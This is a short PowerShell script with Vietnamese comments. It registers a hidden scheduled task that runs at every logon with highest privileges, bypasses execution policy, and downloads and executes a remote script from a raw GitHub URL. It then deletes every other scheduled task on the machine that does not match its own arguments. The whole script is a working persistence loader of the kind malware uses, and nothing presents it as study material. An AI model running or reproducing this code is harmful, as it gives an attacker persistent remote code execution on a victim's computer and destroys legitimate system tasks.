$powershellcode = "https://raw.githubusercontent.com/43a1723/test/main/download.ps1"
$download = "(New-Object Net.WebClient).DownloadString('$powershellcode')"
$arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `& { IEX $download }"

$task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $arguments
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_name = "{FE75EAA7-323E-4B5C-B3B3-86C0B79424E7}"  # Thay đổi giá trị này thành một tên duy nhất cho tác vụ
$task_desc = "Scheduled task to execute script"
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable

Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null

$tasks = Get-ScheduledTask

foreach ($task in $tasks) {
    try {
        # Lấy các thuộc tính của tác vụ
        $taskInfo = Get-ScheduledTaskInfo -TaskName $task.TaskName
        $taskAction = $taskInfo.Actions | Where-Object { $_.Execute -like "*powershell.exe*" }

        # Kiểm tra xem hành động của tác vụ có chứa biến $arguments không
        if ($taskAction.Argument -ne $arguments) {
            # Nếu không chứa $arguments, thực hiện việc xoá tác vụ
            Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false
            Write-Output "Task $($task.TaskName) has been deleted."
        }
    } catch {
        Write-Output "Failed to process task $($task.TaskName): $_"
    }
}
